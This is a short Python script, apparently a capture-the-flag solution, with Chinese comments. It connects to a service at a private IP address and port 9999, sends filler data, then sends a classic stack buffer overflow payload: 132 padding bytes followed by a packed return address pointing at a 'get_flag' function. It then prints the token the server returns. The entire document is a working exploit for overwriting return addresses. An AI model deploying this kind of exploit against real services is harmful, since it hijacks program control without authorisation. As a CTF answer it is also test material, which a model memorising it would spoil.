import socket
import struct

# 获取token的服务器地址，固定
TARGET_HOST = "172.17.43.31"
TARGET_PORT = 9999

GET_FLAG = 0x00401000 # get_flag函数地址
OFFSET = 128 + 4 # 栈偏移

def get_token():
    payload = b"A" * OFFSET
    payload += struct.pack("<I", GET_FLAG)
    payload += b"\n"

    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10) as sock:
        sock.settimeout(5)

        banner = sock.recv(1024)
        print(banner.decode(errors="replace"), end="") # Data :
        # 发送512字节填充数据
        sock.sendall(b"A"*511 + b"\n") 

        prompt = sock.recv(1024)
        print(prompt.decode(errors="replace"), end="") # Input :
        # 发送payload
        sock.sendall(payload) 

        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

    text = response.decode(errors="replace")
    print(text)

    return text

if __name__ == "__main__":
    get_token()